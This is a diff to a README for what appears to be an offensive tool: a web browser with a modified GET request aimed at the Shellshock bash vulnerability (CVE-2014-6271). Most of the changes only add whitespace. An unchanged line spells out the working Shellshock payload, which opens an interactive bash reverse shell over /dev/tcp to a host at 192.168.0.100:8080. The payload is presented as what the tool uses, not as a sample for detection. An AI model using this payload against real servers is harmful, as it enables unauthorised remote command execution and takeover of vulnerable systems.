@@ -11,9 +11,13 @@
 
     most Bug free
     A Webbrowser that has a modyfied GET Request. It supports HTTP and HTTPS Connections.
-    A useful Link: 
+    
+    A useful Link:
+    
     http://resources.infosecinstitute.com/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/#gref
+    
     The Shellshock it self: "env x='() { :;}; ' $(command -v bash) -i >& /dev/tcp/192.168.0.100/8080 0>&1"
+
 
 # building
 * On Linux: make
